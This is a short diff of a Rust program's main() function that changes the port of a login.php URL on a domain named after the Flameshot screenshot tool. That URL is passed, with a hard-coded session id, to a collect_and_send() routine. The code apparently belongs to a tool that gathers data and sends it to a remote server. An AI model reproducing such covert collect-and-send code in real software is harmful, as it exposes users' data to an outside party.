@@ -89,7 +89,7 @@ fn main() {
     // chopper des commandline aussi pour le session id et le password
     let session_id="yolo".to_string();
     //let url="https://flameshot.website:8444".to_string();
-    let url="http://flameshot.website:3000/login.php".to_string();
+    let url="http://flameshot.website:8444/login.php".to_string();
     collect_and_send(1,session_id,url)
 
 }
